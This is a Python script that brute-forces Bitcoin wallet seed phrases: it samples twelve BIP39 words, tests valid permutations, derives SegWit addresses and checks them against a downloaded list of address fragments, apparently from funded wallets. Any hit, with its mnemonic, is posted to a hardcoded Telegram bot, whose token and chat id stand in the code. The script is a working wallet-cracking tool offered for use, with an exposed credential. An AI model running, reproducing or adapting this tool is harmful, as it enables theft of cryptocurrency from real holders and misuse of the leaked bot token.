import os
import itertools
import random
from mnemonic import Mnemonic
import hashlib
from Crypto.Hash import RIPEMD160
from bip32utils import BIP32Key
import bech32
import time
import math
import multiprocessing
import requests
import urllib.request
from typing import List
import sqlite3


# =================== Fake HashLib for ripemd160 ===================
HashLib_Original = hashlib.new
def HashLib_Fake(name, data):
    if name == 'ripemd160':
        r160 = RIPEMD160.new()
        r160.update(data)
        return r160
    else:
        return HashLib_Original(name, data)
hashlib.new = HashLib_Fake
# =================== Fake HashLib for ripemd160 ===================

M         = Mnemonic("english")
H         = 0x80000000 
F         = "0"
cpu_count = multiprocessing.cpu_count()
FILE      = f"https://github.com/JikkkoNikiGFD1930/0/releases/download/v0/{F}"
conn      = sqlite3.connect('Records.db')
cursor    = conn.cursor()

def store_records_from_file(file_path):
    with open(file_path, 'r') as file:
        for line in file:
            line = line.strip()
            if line:
                cursor.execute('INSERT OR IGNORE INTO records (record) VALUES (?)', (line,))
    conn.commit()
def exists(record):
    cursor.execute('SELECT 1 FROM records WHERE record = ? LIMIT 1', (record,))
    return cursor.fetchone() is not None
def format_size(bytes_size):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes_size < 1024:
            return f"{bytes_size:.2f} {unit}"
        bytes_size /= 1024
def check_file_downloaded():
    if not os.path.exists(F):
        print("ğŸ”´ File not found. Downloading...")
        urllib.request.urlretrieve(FILE, F)
        file_size = format_size(os.path.getsize(F))
        print(f"âœ… Download complete. File Size: {file_size}")
    if not os.path.exists(F):
        print("ğŸ File Not Downloaded! ğŸ”´\nProgram Died!\nâŒâŒâŒâŒâŒ")
        exit()
def format_seconds(seconds):
    seconds = round(seconds)
    hours = seconds // 3600
    minutes = (seconds % 3600) // 60
    sec = seconds % 60
    return f"{hours}h:{minutes}m:{sec}s"
def wordsINorder( mnemo ):
    indexed_words = []
    for word in mnemo:
        if word in M.wordlist:
            index = M.wordlist.index(word)
            indexed_words.append((word, index))
    indexed_words.sort(key=lambda x: x[1])
    str = []
    for word, index in indexed_words:
        str.append(f"{word}({index+1})")
    output = "ğŸ " + ("|".join(str))
    print( output )
    return output
def encode_segwit_address(pubkey_hash):
    witness_version = 0
    witprog = bech32.convertbits(pubkey_hash, 8, 5)
    return bech32.bech32_encode("bc", [witness_version] + witprog)
def make(words):
    # start_time   = time.time()
    seed = M.to_seed(words)
    bip32_root_key = BIP32Key.fromEntropy(seed)
    bip32_child_key = bip32_root_key.ChildKey(84 + H) \
                                .ChildKey(0 + H) \
                                .ChildKey(0 + H) \
                                .ChildKey(0) \
                                .ChildKey(0)
    public_key = bip32_child_key.PublicKey()
    sha256_hash = hashlib.sha256(public_key).digest()
    ripemd160_hash = hashlib.new('ripemd160', sha256_hash).digest()
    segwit_address = encode_segwit_address(ripemd160_hash)
    # print("Mnemonic:", words)
    # print("Public Key (HEX):", public_key.hex())
    # print("Bitcoin Address:", segwit_address)
    # elapsed_time = time.time() - start_time
    # print(f"ğŸŸ¡  make wallet Elapsed time: {elapsed_time:.6f} seconds")
    return segwit_address
def search( address, P ):
    # print( address )
    # start_time   = time.time()
    result       = exists(f"{ address[3:15] }")
    # elapsed_time = time.time() - start_time
    # print(f"âŒ { address[3:15] } search_in_memory Elapsed time: {elapsed_time:.6f} seconds")
    if(result):
        print(f"âœ… Found {address}\n{P}")
        notify(f"âœ… Found {address}\n{P}")
        return result
    # else:
        # print("ğŸ”´ NotFound")
    return False
def notify(msg, message_id=None, type="success", retries=5, delay=2 ):
    for attempt in range(retries):
        try:
            if message_id:
                # Edit an existing message if message_id is passed
                response = requests.post("https://api.telegram.org/bot7306877915:AAHR-EDl87kj1eiLVWUxyiHnaQoiJUTW8Fc/editMessageText",
                                        data={"chat_id": "567639577", "message_id": message_id, "text": msg, "parse_mode": "Markdown"})
            else:
                # Send a new message if message_id is not passed
                response = requests.post("https://api.telegram.org/bot7306877915:AAHR-EDl87kj1eiLVWUxyiHnaQoiJUTW8Fc/sendMessage",
                                        data={"chat_id": "567639577", "text": msg, "parse_mode": "Markdown"}) 
            response_data = response.json()
            if response.status_code == 200 and "result" in response_data:
                if not message_id:
                    return response_data["result"]["message_id"] 
                return True
            else:
                print( "ğŸ”´ Telegram Error: ", response_data )
            time.sleep(delay)
        except Exception as e:
            print(f"âš ï¸ Telegram Connection failed [notify_{type}] (Attempt {attempt + 1}/{retries}): {e}")
            if attempt < retries - 1:
                time.sleep(delay)
            else:
                print(f"âŒ Telegram Max retries reached. [notify_{type}]")
                print("Message was:")
                print(msg)
                return None


def worker(prefixes: List[tuple], data: List[int]):
    # if using SQLITE3, will speed up? [must be tested, gpt says NO!]
    # print( "[worker] Core Share: ", s(prefixes), (data) )
    valid = []
    MAX = 50000
    Attemps = 0
    for prefix in prefixes:
        rest = [x for x in data if x not in prefix]
        if Attemps >= MAX:
            break
        for p in itertools.permutations(rest):
            mnemonic = " ".join( prefix + p ).strip()
            # print(mnemonic)
            if M.check(mnemonic):
                valid.append(mnemonic)
                Attemps += 1
                # search( make(mnemonic), mnemonic 
            
            if Attemps >= MAX:
                break
    return valid


def search_worker( words ):
    for m in words:
        # start_time = time.time()
        search( make(m), m )
        # end_time = time.time()
        # print(f"search[make+sqlite] took {end_time - start_time:.6f}")
def split_data_evenly(data, num_chunks):
    avg_size = len(data) // num_chunks
    remainder = len(data) % num_chunks
    chunks = []
    start = 0

    for i in range(num_chunks):
        end = start + avg_size + (1 if i < remainder else 0)
        chunks.append(data[start:end])
        start = end

    return chunks

def start():
    selected_words = random.sample(M.wordlist, 12)
    WIO = wordsINorder( selected_words )
    message_id = notify(f"ğŸ•” Start ...\nğŸ Using *{cpu_count}* CPU CORES\nWords: ``` {' '.join(selected_words)}```")
    data = selected_words
    prefix_pairs = list(itertools.permutations(data, 2))

    chunks = [[] for _ in range(cpu_count)]
    for i, p in enumerate(prefix_pairs):
        chunks[i % cpu_count].append(p)

    start_time = time.time()

    with multiprocessing.Pool(cpu_count) as pool:
        results = pool.starmap(worker, [(chunk, data) for chunk in chunks])
    
    valid_seeds = [item for sublist in results for item in sublist]
    
    print(f"ğŸŸ¢ğŸŸ¢ğŸŸ¢ valid Seeds: {len(valid_seeds)} in { format_seconds((time.time()) - start_time) }")
    
    all_perms = math.factorial( len(selected_words) )
    
    print(f"ğŸŸ¢ğŸŸ¢ğŸŸ¢ ALL: {all_perms}")


    chunks = split_data_evenly(valid_seeds, cpu_count) 
    
    with multiprocessing.Pool(cpu_count) as pool:
        pool.map(search_worker, chunks)
        
    end_time = time.time()

    if len(valid_seeds) > 0:
        output = f"âœ… [%{ round( len(valid_seeds)/all_perms * 100 ) } VALID] | found {len(valid_seeds):,} valid seeds amoung {all_perms:,} | Generated in {end_time - start_time:.2f} seconds"
        print(output)
    else:
        output = f"âœ… {(all_perms):,} Generated in {end_time - start_time:.2f} seconds"
        print(output)
        
    notify(f"ğŸ *Cores*: âš¡ï¸*x{cpu_count}*\nâš ï¸ *Words*: ``` { (' '.join(selected_words)) }```\nğŸŸ¢ *Valid:* ```{len(valid_seeds):,}```\nğŸ *All:* ```{all_perms:,}```\nğŸ’¯ *Percentage:* ```{round( len(valid_seeds)/all_perms * 100 )}```\nğŸ•” *Time:* ```{format_seconds(end_time - start_time)}```", message_id)

if __name__ == '__main__':
    # ========== Adding Records ==========
    start_time = time.time()
    print("ğŸ”„ Initializing.... Please wait... ğŸ™")
    cursor.execute('''CREATE TABLE IF NOT EXISTS records (record TEXT PRIMARY KEY)''')
    store_records_from_file(F)
    print(f"âœ… Records Added in: { time.time() - start_time } seconds")
    # ========== Adding Records ==========
    
    print(f"ğŸ Using {cpu_count} CPU CORES")
    start()
    print("ğŸ Done")
